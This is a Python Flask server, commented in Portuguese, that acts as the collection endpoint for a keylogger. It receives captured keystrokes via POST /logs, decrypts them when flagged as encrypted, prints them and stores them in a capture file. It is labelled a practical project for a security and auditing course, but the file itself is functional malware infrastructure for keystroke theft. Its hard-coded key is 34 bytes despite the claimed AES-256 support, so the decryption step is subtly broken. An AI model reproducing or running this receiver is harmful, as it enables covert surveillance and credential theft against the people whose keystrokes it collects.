#!/usr/bin/env python3

from flask import Flask, request, jsonify
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64
import os

app = Flask(__name__)

ARQUIVO_CAPTURAS = "capturas.txt"
PORTA = 5000
CHAVE_AES = b'ChaveSecreta1234567890123456789012'

def descriptografar_aes(dados_criptografados):
    try:
        dados_bytes = base64.b64decode(dados_criptografados)
        iv = dados_bytes[:16]
        texto_criptografado = dados_bytes[16:]
        cipher = Cipher(
            algorithms.AES(CHAVE_AES),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        texto_padded = decryptor.update(texto_criptografado) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        texto_bytes = unpadder.update(texto_padded) + unpadder.finalize()
        return texto_bytes.decode('utf-8')
    except Exception as e:
        return f"[ERRO AO DESCRIPTOGRAFAR: {e}]"

def salvar_captura(dados, timestamp, criptografado=False):
    data_hora = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    with open(ARQUIVO_CAPTURAS, 'a', encoding='utf-8') as arquivo:
        arquivo.write("="*80 + "\n")
        arquivo.write(f"Data/Hora: {data_hora}\n")
        arquivo.write(f"Timestamp: {timestamp}\n")
        arquivo.write(f"Criptografado: {'Sim' if criptografado else 'Não'}\n")
        arquivo.write("-"*80 + "\n")
        arquivo.write(f"{dados}\n")
        arquivo.write("="*80 + "\n\n")

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>Servidor de Captura - Keylogger</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background-color: #f0f0f0; }
                .container { background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h1 { color: #333; }
                .status { color: green; font-weight: bold; }
                .info { background-color: #e7f3ff; padding: 15px; border-left: 4px solid #2196F3; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔒 Servidor de Captura - Keylogger</h1>
                <p class="status">✓ Servidor Online e Operacional</p>
                <div class="info">
                    <h3>Informações do Servidor:</h3>
                    <ul>
                        <li><strong>Endpoint:</strong> POST /logs</li>
                        <li><strong>Porta:</strong> 5000</li>
                        <li><strong>Arquivo de saída:</strong> capturas.txt</li>
                        <li><strong>Suporte a criptografia:</strong> AES-256-CBC</li>
                    </ul>
                </div>
                <p><em>Projeto Prático - Segurança e Auditoria de Sistemas</em></p>
            </div>
        </body>
    </html>
    """

@app.route('/logs', methods=['POST'])
def receber_logs():
    try:
        dados_json = request.get_json()
        if not dados_json:
            return jsonify({'erro': 'Nenhum dado recebido'}), 400
        dados = dados_json.get('dados', '')
        timestamp = dados_json.get('timestamp', datetime.now().timestamp())
        criptografado = dados_json.get('criptografado', False)
        if criptografado:
            print("\n" + "="*80)
            print("[*] DADOS CRIPTOGRAFADOS RECEBIDOS")
            print("="*80)
            print(f"[*] Timestamp: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"[*] Dados criptografados (primeiros 100 chars):")
            print(f"    {dados[:100]}...")
            dados_descriptografados = descriptografar_aes(dados)
            print(f"\n[*] Dados descriptografados:")
            print(f"    {dados_descriptografados}")
            print("="*80 + "\n")
            salvar_captura(f"CRIPTOGRAFADO:\n{dados}\n\nDESCRIPTOGRAFADO:\n{dados_descriptografados}",
                          timestamp, criptografado=True)
        else:
            print("\n" + "="*80)
            print("[*] DADOS EM TEXTO CLARO RECEBIDOS")
            print("="*80)
            print(f"[*] Timestamp: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"[*] Dados recebidos:")
            print(f"    {dados}")
            print("="*80 + "\n")
            salvar_captura(dados, timestamp, criptografado=False)
        return jsonify({
            'status': 'sucesso',
            'mensagem': 'Dados recebidos e salvos com sucesso',
            'timestamp': timestamp
        }), 200
    except Exception as e:
        print(f"\n[!] ERRO ao processar requisição: {e}\n")
        return jsonify({'erro': str(e)}), 500

@app.route('/status')
def status():
    return jsonify({
        'status': 'online',
        'arquivo': ARQUIVO_CAPTURAS,
        'porta': PORTA,
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    print("="*80)
    print("SERVIDOR HTTP - RECEPTOR DE KEYLOGGER")
    print("="*80)
    print(f"[*] Arquivo de saída: {ARQUIVO_CAPTURAS}")
    print(f"[*] Porta: {PORTA}")
    print(f"[*] Suporte a AES-256: Ativado")
    print("[*] Aguardando conexões...")
    print("="*80)
    print()
    if not os.path.exists(ARQUIVO_CAPTURAS):
        with open(ARQUIVO_CAPTURAS, 'w', encoding='utf-8') as f:
            f.write(f"# Capturas do Keylogger - Iniciado em {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    app.run(host='0.0.0.0', port=PORTA, debug=False)
